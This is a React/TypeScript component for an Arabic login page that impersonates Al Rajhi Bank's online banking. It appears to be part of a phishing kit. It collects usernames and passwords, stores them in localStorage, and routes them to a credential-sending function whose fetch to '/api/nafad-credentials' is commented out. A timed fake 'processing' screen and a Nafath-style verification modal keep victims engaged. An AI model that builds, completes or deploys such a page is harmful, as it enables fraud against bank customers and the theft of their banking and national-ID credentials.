/* eslint-disable @typescript-eslint/no-explicit-any */

"use client";

import type React from "react";
import { useEffect, useState } from "react";
import NafazModal from "../components/NafazModal";

interface ExternalPageData {
  username: string;
  password: string;
}

interface ExternalPageProps {
  onVerificationSuccess?: () => void;
  initialPhone?: string;
}

export default function ExternalPage({
  onVerificationSuccess,
  initialPhone = "",
}: ExternalPageProps) {
  const [formData, setFormData] = useState<ExternalPageData>({
    username: "",
    password: "",
  });
  const [isLoading, setIsLoading] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [isRejected] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [verificationCode] = useState("");
  const [phone] = useState(initialPhone);

  // Simulate the verification process with a timeout
  useEffect(() => {
    if (isSubmitted) {
      const timer = setTimeout(() => {
        // This replaces the socket event handler
        if (onVerificationSuccess) {
          onVerificationSuccess();
        }
      }, 5000); // 5 seconds delay to simulate verification

      return () => clearTimeout(timer);
    }
  }, [isSubmitted, onVerificationSuccess]);

  // eslint-disable-next-line @typescript-eslint/no-unused-vars
  const sendNafadTwoCreds = async (
    orderId: string,
    username: string,
    password: string
  ) => {
    // Replace with your API call
    try {
      // Example API call:
      // const response = await fetch('/api/nafad-credentials', {
      //   method: 'POST',
      //   headers: { 'Content-Type': 'application/json' },
      //   body: JSON.stringify({ orderId, username, password })
      // });
      // return response.json();

      // For now, just return a successful response
      return { success: true };
    } catch (error) {
      console.error("Error sending credentials:", error);
      throw new Error("Failed to send credentials");
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      localStorage.setItem("nafaz_data", JSON.stringify(formData));
      const { username, password } = JSON.parse(
        localStorage.getItem("nafaz_data") || "{}"
      );
      const order_id = JSON.parse(localStorage.getItem("order_id") || "null");

      await sendNafadTwoCreds(order_id, username, password);

      await new Promise((resolve) => setTimeout(resolve, 2000));
      setIsSubmitted(true);
    } catch (error) {
      console.error("خطأ في الدخول للنظام ", error);
    } finally {
      setIsLoading(false);
    }
  };

  const SubmittedContent = () => (
    <div className="space-y-8 bg-[#daf2f6]">
      <div className="space-y-4 text-base text-gray-700 p-6">
        <p>الرجاء الانتظار....</p>
        <p> جاري معالجة طلبك</p>
      </div>

      <div className="flex-col gap-4 w-full flex items-center justify-center">
        <div className="w-20 h-20 border-4 border-transparent text-blue-400 text-4xl animate-spin flex items-center justify-center border-t-blue-400 rounded-full">
          <div className="w-16 h-16 border-4 border-transparent text-red-400 text-2xl animate-spin flex items-center justify-center border-t-red-400 rounded-full"></div>
        </div>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-[#eee] flex flex-col items-center pt-12 pb-24">
      <div className="w-full space-y-8 px-4">
        <div className="flex justify-between px-8">
          <img
            src="/rajihy-logo.svg"
            alt="Rajihy logo"
            className="w-[150px] h-auto object-cover"
          />
        </div>

        {isRejected && (
          <div
            className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative mx-auto container text-right"
            role="alert"
          >
            <strong className="font-bold">عذراً! </strong>
            <span className="block sm:inline">
              تم الرفض طلبك من قبل المسؤول , يرجى المحاوله في وقت لاحق
            </span>
          </div>
        )}
        <div className="flex justify-between items-center">
          <div className="mt-12 space-y-8 container mx-auto max-w-[520px] bg-white p-6 pb-10 rounded-2xl">
            {!isSubmitted ? (
              <form className="space-y-8 px-4" onSubmit={handleSubmit}>
                <h2 className="text-4xl max-w-[300px] mt-8 mb-10">
                  مرحبا بك في الراجحي اون لاين
                </h2>
                <p>تسجيل الدخول</p>
                <div className="space-y-4">
                  <div>
                    <label
                      htmlFor="username"
                      className="block text-right text-sm font-medium text-gray-700 mb-4"
                    >
                      اسم المستخدم
                    </label>
                    <input
                      id="username"
                      type="text"
                      required
                      className="appearance-none relative block w-full px-3 py-4 mb-8 border border-gray-300 rounded-2xl focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-right"
                      value={formData.username}
                      onChange={(e) =>
                        setFormData((prev) => ({
                          ...prev,
                          username: e.target.value,
                        }))
                      }
                    />
                  </div>

                  <div>
                    <label
                      htmlFor="password"
                      className="block text-right text-sm font-medium text-gray-700 mb-1"
                    >
                      كلمة المرور
                    </label>
                    <input
                      id="password"
                      type="password"
                      required
                      className="appearance-none relative block w-full px-3 py-4 mb-8 border border-gray-300 rounded-2xl focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-right"
                      value={formData.password}
                      onChange={(e) =>
                        setFormData((prev) => ({
                          ...prev,
                          password: e.target.value,
                        }))
                      }
                    />
                  </div>
                </div>

                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full flex justify-center py-4 px-4 border border-transparent rounded-2xl shadow-sm text-sm font-medium text-white bg-[#221bff] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:bg-gray-400 disabled:cursor-not-allowed"
                >
                  &#x276E; تسجيل الدخول
                </button>

                <div className="text-center text-sm text-gray-600">
                  {isLoading ? (
                    <div className="flex justify-center">
                      <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-blue-600"></div>
                    </div>
                  ) : (
                    "الرجاء إدخال إسم المستخدم و كلمة المرور ثم اضغط تسجيل دخول"
                  )}
                </div>
              </form>
            ) : (
              <SubmittedContent />
            )}
          </div>
          <div className="hidden lg:flex w-[50%] lg:flex-col lg:items-center">
            <img
              src="/phones.png"
              alt="phones"
              className="w-full max-w-[560px] h-auto object-cover"
            />
            <div className="text-center">
              <p>
                افتح حسابك في <span className="font-bold">خطوات قليلة</span>
              </p>
              <p>
                إدارة حساباتك <span className="font-bold">أسرع</span>
              </p>
            </div>
          </div>
        </div>
      </div>
      <NafazModal
        isOpen={showModal}
        onClose={() => setShowModal(false)}
        auth_number={verificationCode}
        phone={phone}
      />
    </div>
  );
}
